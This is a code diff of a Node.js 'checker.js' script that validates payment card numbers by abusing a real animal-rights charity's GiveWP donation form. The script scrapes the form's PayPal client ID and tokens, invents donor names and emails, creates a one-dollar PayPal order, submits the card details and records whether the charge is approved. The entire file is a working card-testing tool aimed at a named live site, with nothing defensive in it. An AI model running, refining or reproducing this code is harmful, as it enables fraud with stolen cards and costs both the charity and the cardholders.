@@ -1,31 +1,22 @@
+const fs = require('fs');
 const cookieJar = new Map();
 
-// Helper for random strings
 const randomString = (length) =>
     Array(length)
         .fill(0)
         .map(() => 'abcdefghijklmnopqrstuvwxyz'[Math.floor(Math.random() * 26)])
         .join('');
 
-// Public Email API (Mail.gw fallback)
-async function getPublicEmail() {
-    try {
-        const domainRes = await fetch('https://api.mail.gw/domains');
-        const domainData = await domainRes.json();
-        const domain = domainData['hydra:member']?.[0]?.domain;
-        if (domain) return `\( {randomString(10)}@ \){domain}`;
-    } catch {}
-    return `${randomString(10)}@outlook.com`;
-}
-
 async function request(url, options = {}) {
     const headers = new Headers(options.headers || {});
-
     const cookieString = Array.from(cookieJar)
         .map(([key, value]) => `\( {key}= \){value}`)
         .join('; ');
 
-    if (cookieString) headers.set('cookie', cookieString);
+    if (cookieString) {
+        headers.set('cookie', cookieString);
+    }
+
     if (!headers.has('user-agent')) {
         headers.set(
             'user-agent',
@@ -46,156 +37,140 @@ async function request(url, options = {}) {
     return response;
 }
 
-export default async function handler(req, res) {
-    cookieJar.clear(); // Fresh session per request
+(async () => {
+    const args = process.argv[2];
 
-    const { data: inputData } = req.query;
-    if (!inputData) {
-        return res.status(400).json({ error: 'Usage: /api?data=number|mm|yy|cvv' });
+    if (!args) {
+        console.error('Usage: node checker.js "number|mm|yy|cvv"');
+        return;
     }
 
-    const [number, month, yearShort, cvv] = inputData.split('|');
-    if (!number || !month || !yearShort || !cvv) {
-        return res.status(400).json({ error: 'Invalid card format' });
-    }
-
-    const email = await getPublicEmail();
+    const [number, month, yearShort, cvv] = args.split('|');
     const user = {
         firstName: randomString(6),
         lastName: randomString(6),
-        email,
+        email: `${randomString(10)}@outlook.com`,
     };
 
     try {
-        // 1. Get main donation page → find form view URL
         const html = await (await request('https://animalrights.org.au/donate-now/')).text();
         const formUrlMatch = html.match(/data-form-view-url=['"]([^'"]+)['"]/);
         if (!formUrlMatch) throw new Error("Could not find data-form-view-url");
 
         const formUrl = formUrlMatch[1].replace(/&amp;/g, '&');
-        const formText = await (await request(formUrl)).text();
-
-        // Extract window.givewpDonationFormExports = {...};
+        const formResponse = await request(formUrl);
+        const formText = await formResponse.text();
         const exportedMatch = formText.match(/window\.givewpDonationFormExports\s*=\s*({[\s\S]*?});/);
         if (!exportedMatch) throw new Error("Could not find givewpDonationFormExports");
 
-        const data = JSON.parse(exportedMatch[1]);
-        const gateway = data.registeredGateways?.find(g => g.id === 'paypal-commerce');
-        if (!gateway) throw new Error("paypal-commerce gateway not found in registeredGateways");
+        const exported = exportedMatch[1];
+        const data = JSON.parse(exported);
+
+        const gateway = data.registeredGateways?.find((gateway) => gateway.id === 'paypal-commerce');
+        if (!gateway) throw new Error("paypal-commerce gateway not found");
 
         const settings = gateway.settings;
-        const clientId = settings?.sdkOptions?.clientId;
-        if (!clientId) throw new Error("No PayPal clientId found in settings");
 
-        // 2. Get PayPal access token
+        // Fetch PayPal Access Token
+        const clientId = settings.sdkOptions?.clientId;
+        if (!clientId) throw new Error("No PayPal clientId found");
+
         const auth = Buffer.from(`${clientId}:`).toString('base64');
-        const tokenRes = await request('https://api.paypal.com/v1/oauth2/token', {
+        const tokenResponse = await request('https://api.paypal.com/v1/oauth2/token', {
             method: 'POST',
             headers: {
                 'Authorization': `Basic ${auth}`,
                 'Content-Type': 'application/x-www-form-urlencoded',
+                'Accept': 'application/json'
             },
-            body: 'grant_type=client_credentials',
+            body: 'grant_type=client_credentials'
         });
 
-        if (!tokenRes.ok) {
-            throw new Error(`PayPal auth failed: ${await tokenRes.text()}`);
+        if (!tokenResponse.ok) {
+            throw new Error(`PayPal auth failed: ${await tokenResponse.text()}`);
         }
 
-        const { access_token: accessToken } = await tokenRes.json();
+        const tokenData = await tokenResponse.json();
+        const accessToken = tokenData.access_token;
         if (!accessToken) throw new Error("No access_token received");
 
-        // 3. Create PayPal order via GiveWP AJAX
         const params = new URLSearchParams(new URL(data.donateUrl).search);
         const tokens = {
-            formId: settings.donationFormId?.toString(),
+            formId: settings.donationFormId.toString(),
             formHash: settings.donationFormNonce,
             signature: params.get('givewp-route-signature'),
+            signatureExpiration: params.get('givewp-route-signature-expiration'),
             signatureId: params.get('givewp-route-signature-id'),
-            signatureExp: params.get('givewp-route-signature-expiration'),
         };
 
-        if (!tokens.formId || !tokens.formHash) {
-            throw new Error("Missing formId or formHash");
-        }
+        const formData = new FormData();
+        Object.entries({
+            action: 'give_paypal_commerce_create_order',
+            'give-form-id': tokens.formId,
+            'give-form-hash': tokens.formHash,
+            give_payment_mode: 'paypal-commerce',
+            'give-amount': '1',
+            give_first: user.firstName,
+            give_last: user.lastName,
+            give_email: user.email,
+            'give-cs-form-currency': 'AUD',
+            'give-gateway': 'paypal-commerce', // sometimes needed
+        }).forEach(([key, value]) => formData.append(key, value));
 
-        const orderFormData = new FormData();
-        orderFormData.append('action', 'give_paypal_commerce_create_order');
-        orderFormData.append('give-form-id', tokens.formId);
-        orderFormData.append('give-form-hash', tokens.formHash);
-        orderFormData.append('give_payment_mode', 'paypal-commerce');
-        orderFormData.append('give-amount', '1');
-        orderFormData.append('give_first', user.firstName);
-        orderFormData.append('give_last', user.lastName);
-        orderFormData.append('give_email', user.email);
-        orderFormData.append('give-cs-form-currency', 'AUD');
-        orderFormData.append('give-gateway', 'paypal-commerce'); // sometimes needed
-
-        const orderRes = await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
+        const orderResponse = await request('https://animalrights.org.au/wp-admin/admin-ajax.php', {
             method: 'POST',
-            body: orderFormData,
+            body: formData,
         });
 
-        if (!orderRes.ok) {
-            const errText = await orderRes.text();
-            throw new Error(`GiveWP AJAX failed (${orderRes.status}): ${errText.slice(0, 300)}`);
+        if (!orderResponse.ok) {
+            const errText = await orderResponse.text();
+            throw new Error(`GiveWP AJAX failed (${orderResponse.status}): ${errText.slice(0, 300)}`);
         }
 
-        let orderJson;
+        let orderData;
         try {
-            orderJson = await orderRes.json();
+            orderData = await orderResponse.json();
         } catch (e) {
-            const text = await orderRes.text();
+            const text = await orderResponse.text();
             throw new Error(`GiveWP response not JSON: ${text.slice(0, 200)}`);
         }
 
-        // ─── Extract order ID ──────────────────────────────────────────────
+        // Extract orderId
         let orderId = null;
-
-        // Standard GiveWP + PayPal Commerce success path
-        if (orderJson?.success && orderJson?.data?.id) {
-            orderId = orderJson.data.id;
-        }
-        // Flat id
-        else if (orderJson?.id) {
-            orderId = orderJson.id;
-        }
-        // Other common variants
-        else if (orderJson?.data?.order?.id) {
-            orderId = orderJson.data.order.id;
-        } else if (orderJson?.orderID) {
-            orderId = orderJson.orderID;
-        } else if (orderJson?.data?.orderID) {
-            orderId = orderJson.data.orderID;
-        } else if (orderJson?.paypal_order_id) {
-            orderId = orderJson.paypal_order_id;
+        if (orderData?.success === true) {
+            if (typeof orderData.data === 'string' && orderData.data.length > 15) {
+                orderId = orderData.data;
+            } else if (orderData.data?.id) {
+                orderId = orderData.data.id;
+            } else if (orderData.data?.orderID) {
+                orderId = orderData.data.orderID;
+            } else if (orderData.data?.order?.id) {
+                orderId = orderData.data.order.id;
+            }
         }
 
-        // Log the full response for debugging (appears in function logs)
-        console.log('GiveWP create-order full response:', JSON.stringify(orderJson, null, 2));
+        // Log full response for debugging
+        console.log('GiveWP full response:', JSON.stringify(orderData, null, 2));
 
         if (!orderId) {
             throw new Error(
                 `No PayPal order ID found in GiveWP response. ` +
-                `Available keys: ${Object.keys(orderJson).join(', ')}. ` +
-                `Check function logs for complete JSON.`
+                `Available keys: ${Object.keys(orderData).join(', ')}. ` +
+                `See console for full JSON.`
             );
         }
 
-        // 4. Supply card details — try PATCH first (preferred), fallback to confirm-payment-source
+        console.log(`Extracted PayPal Order ID: ${orderId}`);
+
+        // Confirm payment source
         const expiry = `\( {month.padStart(2, '0')}/20 \){yearShort.padStart(2, '0')}`;
-
-        let confirmRes;
-        let confirmData;
-
-        // Attempt PATCH /orders/{id} (more modern)
-        confirmRes = await request(
+        let confirmResponse = await request(
             `https://api.paypal.com/v2/checkout/orders/${orderId}`,
             {
                 method: 'PATCH',
                 headers: {
-                    'Authorization': `Bearer ${accessToken}`,
-                    'Content-Type': 'application/json',
+                    authorization: `Bearer ${accessToken}`,
+                    'content-type': 'application/json',
                 },
                 body: JSON.stringify([{
                     op: 'replace',
@@ -219,29 +194,31 @@ export default async function handler(req, res) {
             }
         );
 
-        if (confirmRes.ok) {
-            // If PATCH worked → capture
-            const captureRes = await request(
+        let confirmData;
+        if (confirmResponse.ok) {
+            // If PATCH worked, capture
+            const captureResponse = await request(
                 `https://api.paypal.com/v2/checkout/orders/${orderId}/capture`,
                 {
                     method: 'POST',
                     headers: {
-                        'Authorization': `Bearer ${accessToken}`,
-                        'Content-Type': 'application/json',
+                        authorization: `Bearer ${accessToken}`,
+                        'content-type': 'application/json',
                     },
                     body: JSON.stringify({}),
                 }
             );
-            confirmData = await captureRes.json();
+            confirmData = await captureResponse.json();
         } else {
-            // Fallback: old confirm-payment-source
-            confirmRes = await request(
+            // Fallback to confirm-payment-source
+            console.log('PATCH failed, trying confirm-payment-source...');
+            confirmResponse = await request(
                 `https://api.paypal.com/v2/checkout/orders/${orderId}/confirm-payment-source`,
                 {
                     method: 'POST',
                     headers: {
-                        'Authorization': `Bearer ${accessToken}`,
-                        'Content-Type': 'application/json',
+                        authorization: `Bearer ${accessToken}`,
+                        'content-type': 'application/json',
                     },
                     body: JSON.stringify({
                         payment_source: {
@@ -255,24 +232,60 @@ export default async function handler(req, res) {
                     }),
                 }
             );
-            confirmData = await confirmRes.json();
+            confirmData = await confirmResponse.json();
         }
 
-        // 5. Return result
-        const isSuccess = confirmData?.status === 'COMPLETED' || confirmData?.status === 'APPROVED';
-        res.status(isSuccess ? 200 : 402).json({
-            success: isSuccess,
-            paypal_status: confirmData?.status || confirmData?.name || 'unknown',
-            paypal_response: confirmData,
-            orderId,
-            message: confirmData?.message || confirmData?.details?.[0]?.description || 'See paypal_response',
-        });
+        if (confirmData.status === 'APPROVED' || confirmData.status === 'COMPLETED') {
+            const finalParams = new URLSearchParams({
+                'givewp-route': 'donate',
+                'givewp-route-signature': tokens.signature,
+                'givewp-route-signature-id': tokens.signatureId,
+                'givewp-route-signature-expiration': tokens.signatureExpiration,
+            });
 
+            const finalForm = new FormData();
+            Object.entries({
+                amount: '1',
+                currency: 'AUD',
+                donationType: 'single',
+                formId: tokens.formId,
+                gatewayId: 'paypal-commerce',
+                firstName: user.firstName,
+                lastName: user.lastName,
+                email: user.email,
+                anonymous: 'false',
+                isEmbed: 'true',
+                embedId: 'give-form-shortcode-1',
+                locale: 'en_AU',
+                'gatewayData[payPalOrderId]': orderId,
+                originUrl: 'https://animalrights.org.au/donate-now/',
+            }).forEach(([key, value]) => finalForm.append(key, value));
+
+            const finalResponse = await request(`https://animalrights.org.au/?${finalParams}`, {
+                method: 'POST',
+                body: finalForm,
+                headers: {
+                    accept: 'application/json',
+                    origin: 'https://animalrights.org.au',
+                },
+            });
+
+            const finalText = await finalResponse.text();
+
+            try {
+                const finalJson = JSON.parse(finalText);
+                console.log(JSON.stringify(finalJson, null, 2));
+                fs.writeFileSync('result.txt', JSON.stringify(finalJson));
+            } catch (error) {
+                console.log(finalText);
+                fs.writeFileSync('result.txt', finalText);
+            }
+        } else {
+            console.log(JSON.stringify(confirmData, null, 2));
+            fs.writeFileSync('result.txt', JSON.stringify(confirmData));
+        }
     } catch (error) {
-        console.error('Handler error:', error);
-        res.status(500).json({
-            error: error.message,
-            stack: error.stack?.split('\n').slice(0, 4),
-        });
+        console.error('Error:', error.message);
+        fs.writeFileSync('result.txt', `Error: ${error.message}`);
     }
-                }
+})();
